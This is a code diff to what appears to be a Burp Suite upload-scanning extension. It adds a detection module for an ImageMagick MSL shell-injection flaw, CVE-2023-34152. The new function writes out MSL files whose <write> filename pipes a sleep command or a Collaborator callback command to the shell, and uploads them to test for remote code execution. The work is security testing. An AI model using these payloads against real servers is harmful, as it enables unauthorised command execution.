@@ -320,6 +320,16 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # ('mvg:', '.mvg', 'image/svg+xml'),
         }
 
+        # ImageMagick MSL (Magick Scripting Language) types — CVE-2023-34152
+        self.IM_MSL_TYPES = {
+            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', '.msl', ''),
+            ('', '.msl', 'image/png'),
+            ('msl:', '.msl', ''),
+            ('', '.jpeg', 'image/jpeg'),
+            ('', '.png', 'image/png'),
+        }
+
         # Xbm black/white pictures
         self.XBM_TYPES = {
             # ('', '', ''),
@@ -1177,6 +1187,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 self._bad_manners_cve_2018_16323(injector)
                 colab_tests.extend(self._exiftool_cve_2021_22204(injector, burp_colab))
                 self._imagemagick_cve_2022_44268(injector)
+                colab_tests.extend(self._imagetragick_cve_2023_34152(injector, burp_colab))
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
             # Magick (ImageMagick and GraphicsMagick) - generic, as these are exploiting features
             if injector.opts.modules['magick'].isSelected():
@@ -1534,6 +1545,52 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                                          injector.opts.image_height, injector.opts.image_width)
                 colab_tests.extend(self._send_collaborator(injector, burp_colab, self.IM_SVG_TYPES, basename + "Svg" + cmd_name,
                                                            content_svg, issue, replace=replace))
+
+        return colab_tests
+
+    def _imagetragick_cve_2023_34152(self, injector, burp_colab):
+        # CVE-2023-34152: Shell injection via MSL <write> pipe filename (ImageMagick <= 7.1.1-12).
+        # The MSL coder passes a filename starting with | directly to a shell pipe.
+        name = "ImageMagick MSL RCE CVE-2023-34152"
+        severity = "High"
+        confidence = "Certain"
+        base_detail = "An MSL (Magick Scripting Language) file was uploaded exploiting CVE-2023-34152 " \
+                      "(ImageMagick <= 7.1.1-12, shell injection via MSL <write> pipe filename). " \
+                      "See https://nvd.nist.gov/vuln/detail/CVE-2023-34152 for details. "
+        detail_sleep = "A delay was detected twice when uploading an MSL file with a CVE-2023-34152 payload " \
+                       "that executes a sleep like command. Therefore arbitrary command execution seems possible. " \
+                       "The payload command was {}."
+        detail_colab = "A burp collaborator interaction was detected when uploading an MSL file with a CVE-2023-34152 payload " \
+                       "that executes a command with a burp collaborator URL. Therefore arbitrary command execution seems possible. " \
+                       "The payload command was {} {}. Interactions: <br><br>"
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Im34152"
+        msl_sleep = '<?xml version="1.0" encoding="UTF-8"?>\n' \
+                    '<image>\n' \
+                    '<read filename="ephemeral:/dev/null" />\n' \
+                    '<write filename="|{} {}{}" />\n' \
+                    '</image>'
+        msl_colab = '<?xml version="1.0" encoding="UTF-8"?>\n' \
+                    '<image>\n' \
+                    '<read filename="ephemeral:/dev/null" />\n' \
+                    '<write filename="|{} {}" />\n' \
+                    '</image>'
+
+        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
+            details = base_detail + detail_sleep.format(cmd)
+            issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+            sleep_content = msl_sleep.format(cmd, injector.opts.sleep_time * factor, args)
+            self._send_sleep_based(injector, basename + cmd_name, sleep_content, self.IM_MSL_TYPES, injector.opts.sleep_time, issue)
+
+        if not burp_colab:
+            return []
+        colab_tests = []
+
+        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
+            details = base_detail + detail_colab.format(cmd, server)
+            issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+            attack = msl_colab.format(cmd, server)
+            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.IM_MSL_TYPES, basename + cmd_name,
+                                                       attack, issue, replace=replace))
 
         return colab_tests
 
